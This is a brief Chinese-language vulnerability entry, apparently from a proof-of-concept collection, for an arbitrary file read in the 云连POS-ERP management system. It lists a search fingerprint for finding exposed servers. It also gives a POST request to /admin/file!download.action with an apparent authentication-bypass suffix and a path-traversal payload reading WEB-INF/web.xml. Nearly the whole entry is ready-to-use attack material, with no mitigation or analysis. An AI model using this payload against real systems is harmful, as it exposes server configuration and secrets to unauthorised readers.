# 云连POS-ERP管理系统download.action存在任意文件读取漏洞

云连POS-ERP管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="Powered By chaosZ"`
- **请求**：`POST /admin/file!download.action;admin!login.action HTTP/1.1`

**Payload**
```
downloadFile=../../WEB-INF/web.xml
```
- **响应特征**：200